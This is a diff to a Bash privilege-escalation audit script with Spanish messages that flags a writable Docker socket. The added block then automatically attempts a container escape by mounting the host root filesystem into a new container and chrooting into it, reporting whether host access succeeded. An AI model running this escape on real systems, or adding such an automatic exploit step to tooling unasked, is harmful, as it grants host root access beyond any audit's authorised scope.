@@ -1006,9 +1006,11 @@ if [ $IN_CONTAINER -eq 1 ] || command -v docker &> /dev/null; then
 fi
 
 echo -e "${BLUE}Docker socket access:${NC}"
+DOCKER_SOCKET_WRITABLE=0
 if [ -S /var/run/docker.sock ]; then
     if [ -w /var/run/docker.sock ]; then
         alert_critical "🔴 CRITICAL: /var/run/docker.sock is writable!"
+        DOCKER_SOCKET_WRITABLE=1
     else
         echo "  /var/run/docker.sock exists (not writable by current user)"
     fi
@@ -1016,6 +1018,45 @@ else
     info "Docker socket not found"
 fi
 echo ""
+
+# Intentar escape automático si estamos en contenedor y tenemos docker
+if [ $IN_CONTAINER -eq 1 ] && [ $DOCKER_SOCKET_WRITABLE -eq 1 ] && command -v docker &> /dev/null; then
+    echo -e "${RED}${BOLD}🚀 INTENTO AUTOMÁTICO DE ESCAPE DE CONTENEDOR${NC}"
+    echo ""
+
+    # Obtener la primera imagen disponible
+    ESCAPE_IMAGE=$(docker images --quiet 2>/dev/null | head -1)
+
+    if [ ! -z "$ESCAPE_IMAGE" ]; then
+        alert_critical "🔓 Intentando escape con: docker run -it -v /:/host/ $ESCAPE_IMAGE chroot /host/ bash"
+        echo ""
+        echo -e "${YELLOW}Ejecutando comando...${NC}"
+        echo ""
+
+        # Intentar el escape con timeout
+        ESCAPE_RESULT=$(timeout 5 docker run -it -v /:/host/ "$ESCAPE_IMAGE" chroot /host/ bash -c "id; pwd; echo 'ESCAPE_SUCCESS'" 2>&1 || true)
+
+        if echo "$ESCAPE_RESULT" | grep -q "ESCAPE_SUCCESS"; then
+            alert_critical "✅ ESCAPE EXITOSO! Estás fuera del contenedor"
+            echo "$ESCAPE_RESULT" | sed 's/^/  /'
+            ((CRITICAL++))
+        elif echo "$ESCAPE_RESULT" | grep -q "uid=0"; then
+            alert_high "⚠️  Comando ejecutado con permisos (uid=0 posible)"
+            echo "$ESCAPE_RESULT" | head -10 | sed 's/^/  /'
+            ((HIGH++))
+        else
+            if [ ! -z "$ESCAPE_RESULT" ]; then
+                alert_medium "Respuesta del contenedor:"
+                echo "$ESCAPE_RESULT" | head -10 | sed 's/^/  /'
+            else
+                info "No response from escape attempt (check logs)"
+            fi
+        fi
+    else
+        info "No Docker images available for escape attempt"
+    fi
+    echo ""
+fi
 
 echo -e "${BLUE}Archivos de configuración de Docker:${NC}"
 DOCKER_CONFIGS=(
